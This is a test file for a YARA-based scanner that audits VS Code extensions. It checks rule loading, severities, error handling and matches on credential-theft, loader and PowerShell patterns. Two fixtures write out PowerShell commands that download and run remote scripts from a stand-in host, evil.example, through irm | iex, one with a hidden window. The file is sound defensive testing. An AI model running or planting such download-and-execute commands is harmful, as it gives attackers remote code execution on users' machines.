import { makeContents } from "#internal/test-support/fixtures.js";
import { describe, expect, it, vi } from "vitest";
import { cp, mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { checkYara, isYaraAvailable, listYaraRules } from "#internal/scanner/checks/yara.js";
import { scanExtension } from "#internal/scanner/index.js";
import { extractCapabilities } from "#internal/scanner/capabilities.js";

const yaraAvailable = await isYaraAvailable();

const __dirname = dirname(fileURLToPath(import.meta.url));
const ZOO_YARA_DIR = join(__dirname, "..", "..", "..", "zoo", "signatures", "yara");

describe("listYaraRules", () => {
  it("lists YARA rule files in zoo directory", async () => {
    const rules = await listYaraRules(ZOO_YARA_DIR);

    // We should have some YARA rules in the zoo
    expect(rules).toContain("data_exfiltration.yar");
    // All files should have .yar or .yara extension
    expect(rules.every((r) => r.endsWith(".yar") || r.endsWith(".yara"))).toBe(true);
  });

  it("preserves errors for a non-existent directory", async () => {
    await expect(listYaraRules("/nonexistent/path")).rejects.toThrow("ENOENT");
  });
});

describe("checkYara", () => {
  it.skipIf(!yaraAvailable)("keeps unrelated whole-file references advisory", async () => {
    const contents = makeContents({
      "vendor/reference.js": JSON.stringify([
        "eval(",
        "atob(",
        "String.fromCharCode",
        "fetch(",
        "writeFile",
        "child_process",
        "/tmp/",
        ".npmrc",
        "readFile",
        "remoteCommand",
        "parseCommand",
        "Firefox",
        "IndexedDB",
        "readFileSync",
      ]),
    });
    const result = await checkYara(contents);
    expect(result.warnings).toEqual([]);
    for (const rule of [
      "SUSP_JS_Eval_Base64_Jan25",
      "SUSP_JS_Eval_Charcode_Jan25",
      "SUSP_JS_Obfuscation_Eval_Jan25",
      "LOADER_JS_Download_Write_Execute_Jan25",
      "STEALER_JS_Credential_File_Exfil_Jan25",
      "RAT_JS_GlassWorm_Remote_Exec_Jan25",
      "STEALER_JS_Browser_Data_Theft_Jan25",
    ]) {
      expect(result.findings.find((finding) => finding.id === `YARA_${rule}`)).toMatchObject({
        severity: "medium",
        metadata: { evidence: "co-occurring references" },
      });
    }
    expect(result.findings.some((finding) => finding.severity === "critical")).toBe(false);
    const capabilities = extractCapabilities({ findings: result.findings, observations: [] });
    expect(capabilities.credentials.detected).toBe(false);
    expect(capabilities.credentials.indicators.map((finding) => finding.id)).toContain(
      "YARA_STEALER_JS_Browser_Data_Theft_Jan25",
    );
  });

  it.skipIf(!yaraAvailable)(
    "preserves duplicate rule identifiers in distinct source files",
    async () => {
      const root = await mkdtemp(join(tmpdir(), "vsix-namespaced-rule-"));
      const rules = join(root, "signatures", "yara");
      try {
        await mkdir(rules, { recursive: true });
        for (const dataset of ["blocklist", "iocs", "telemetry"]) {
          await cp(join(ZOO_YARA_DIR, "..", "..", dataset), join(root, dataset), {
            recursive: true,
          });
        }
        for (const [directory, severity] of [
          ["first", "medium"],
          ["second", "critical"],
        ] as const) {
          await mkdir(join(rules, directory));
          await writeFile(
            join(rules, directory, "same.yar"),
            `rule Same { meta: severity = "${severity}" condition: filesize > 0 }`,
          );
        }
        const target = join(root, "extension");
        await mkdir(target);
        await writeFile(join(target, "package.json"), '{"name":"fixture","version":"1.0.0"}');
        vi.stubEnv("VSIX_AUDIT_ZOO_PATH", root);
        const result = await scanExtension(target, {
          output: "json",
          severity: "low",
          modules: ["yara"],
        });
        expect(result.metadata.coverage.warnings).toEqual([]);
        expect(
          result.findings
            .toSorted((a, b) => a.severity.localeCompare(b.severity))
            .map((finding) => [finding.severity, finding.metadata?.["ruleFile"]]),
        ).toEqual([
          ["critical", "second/same.yar"],
          ["medium", "first/same.yar"],
        ]);
      } finally {
        vi.unstubAllEnvs();
        await rm(root, { recursive: true, force: true });
      }
    },
  );

  it.skipIf(!yaraAvailable)("reads severity and source from a tagged rule", async () => {
    const rules = await mkdtemp(join(tmpdir(), "vsix-tagged-rule-"));
    try {
      await writeFile(
        join(rules, "tagged.yar"),
        [
          "rule Tagged : regression {",
          'meta: severity = "critical" description = "review fixture"',
          'strings: $a = "review-sentinel"',
          "condition: $a }",
        ].join("\n"),
      );
      const result = await checkYara(
        makeContents({ "space and\nnewline.js": "review-sentinel" }),
        rules,
      );
      expect(result).toMatchObject({
        warnings: [],
        findings: [
          {
            id: "YARA_Tagged",
            severity: "critical",
            location: { file: "space and\nnewline.js" },
            metadata: { ruleFile: "tagged.yar" },
          },
        ],
      });
    } finally {
      await rm(rules, { recursive: true, force: true });
    }
  });

  it.skipIf(!yaraAvailable)("marks empty and invalid rules as incomplete", async () => {
    const rules = await mkdtemp(join(tmpdir(), "vsix-broken-rules-"));
    try {
      expect(
        (await checkYara(makeContents({ "main.js": "hello" }), rules)).warnings.length,
      ).toBeGreaterThan(0);
      await writeFile(join(rules, "broken.yar"), "rule BROKEN { condition: ??? }");
      const result = await checkYara(makeContents({ "main.js": "hello" }), rules);
      expect(result.warnings.length).toBeGreaterThan(0);
      expect(result.findings).toContainEqual(expect.objectContaining({ id: "YARA_SCAN_ERROR" }));
    } finally {
      await rm(rules, { recursive: true, force: true });
    }
  });
  it.skipIf(yaraAvailable)("explains how to install missing YARA", async () => {
    const contents = makeContents({ "test.js": "console.log('test');" });
    expect((await checkYara(contents)).findings).toMatchObject([
      {
        id: "YARA_NOT_INSTALLED",
        severity: "low",
      },
    ]);
  });

  it.skipIf(!yaraAvailable)(
    "returns empty findings for clean extension when YARA is available",
    async () => {
      const contents = makeContents({
        "extension.js": "console.log('Hello, World!');",
        "package.json": JSON.stringify({ name: "test", version: "1.0.0" }),
      });

      const { findings } = await checkYara(contents);

      // Should not match any YARA rules for clean code
      const yaraMatches = findings.filter(
        (f) => f.id.startsWith("YARA_") && f.id !== "YARA_NOT_INSTALLED",
      );
      expect(yaraMatches).toHaveLength(0);
    },
  );

  it.skipIf(!yaraAvailable)("handles empty extension gracefully", async () => {
    const contents = makeContents({});

    const { findings } = await checkYara(contents);

    expect(findings).toEqual([]);
  });

  it.skipIf(!yaraAvailable)("detects PowerShell hidden window pattern", async () => {
    // Content that matches SUSP_PS_Hidden_Window_Jan25:
    // requires "powershell" AND "-WindowStyle Hidden"
    const maliciousContent = [
      'const cmd = "powershell -WindowStyle Hidden',
      " -Command irm https://evil.example/payload.ps1",
      ' | iex";',
      "require('child_process').exec(cmd);",
    ].join("");

    const contents = makeContents({
      "extension.js": maliciousContent,
    });

    const { findings } = await checkYara(contents);

    const psFindings = findings.filter((f) => f.id === "YARA_SUSP_PS_Hidden_Window_Jan25");
    expect(psFindings).toHaveLength(1);
    expect(psFindings[0]?.severity).toBe("critical");
    expect(psFindings[0]?.metadata?.["ruleFile"]).toBe("powershell_attacks.yar");
  });

  it.skipIf(!yaraAvailable)("detects PowerShell download-execute cradle", async () => {
    // Content that matches LOADER_PS_Download_Execute_Jan25:
    // requires PowerShell context + IEX pipe pattern
    const maliciousContent = [
      "const script = `powershell -Command ",
      '"irm https://evil.example/stage2.ps1 | iex"`;',
    ].join("");

    const contents = makeContents({
      "activate.js": maliciousContent,
    });

    const { findings } = await checkYara(contents);

    const loaderFindings = findings.filter((f) => f.id === "YARA_LOADER_PS_Download_Execute_Jan25");
    expect(loaderFindings).toHaveLength(1);
    expect(loaderFindings[0]?.severity).toBe("critical");
  });

  it.skipIf(!yaraAvailable)(
    "retains rule evidence regardless of generated or dependency paths",
    async () => {
      const rulesDir = await mkdtemp(join(tmpdir(), "vsix-audit-yara-rules-"));
      try {
        await writeFile(
          join(rulesDir, "test.yar"),
          [
            "rule SUSP_JS_WebAssembly_Remote_Jan25 {",
            "  meta:",
            '    severity = "low"',
            '    description = "test wasm pattern"',
            "  strings:",
            '    $a = "WebAssembly.instantiateStreaming"',
            "  condition:",
            "    $a",
            "}",
          ].join("\n"),
        );

        const contents = makeContents({
          "main.js": "WebAssembly.instantiateStreaming(fetch(url));",
          "node_modules/@tybys/wasm-util/dist/wasm-util.js":
            "WebAssembly.instantiateStreaming(fetch(url));",
          "node_modules/@tybys/wasm-util/README.md":
            "WebAssembly.instantiateStreaming(fetch(url));",
          "node_modules/@tybys/wasm-util/dist/wasm-util.d.ts":
            "WebAssembly.instantiateStreaming(fetch(url));",
          "dist/bundle.js": "WebAssembly.instantiateStreaming(fetch(url));",
        });

        const { findings } = await checkYara(contents, rulesDir);
        const wasmFindings = findings.filter(
          (f) => f.id === "YARA_SUSP_JS_WebAssembly_Remote_Jan25",
        );

        expect(new Set(wasmFindings.map((finding) => finding.location?.file))).toEqual(
          new Set(contents.files.keys()),
        );
      } finally {
        await rm(rulesDir, { recursive: true, force: true });
      }
    },
  );
});
